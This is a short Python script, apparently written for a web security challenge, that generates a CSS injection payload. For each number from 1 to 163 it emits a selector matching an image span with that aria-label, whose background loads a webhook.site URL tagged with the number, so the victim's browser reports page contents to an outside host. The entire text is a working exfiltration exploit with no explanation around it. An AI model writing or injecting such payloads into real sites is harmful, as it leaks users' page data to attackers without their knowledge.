exploit_css = ""

for i in range(1, 164):
    exploit_css += '''
    span[role="img"][aria-label="''' + str(i) + '''"]:empty {
        background: url('https://webhook.site/7ecc884d-b05b-4433-97f7-574d1d78dc63/?item=''' + str(i) + '''');
    }
    '''
    
print (exploit_css)
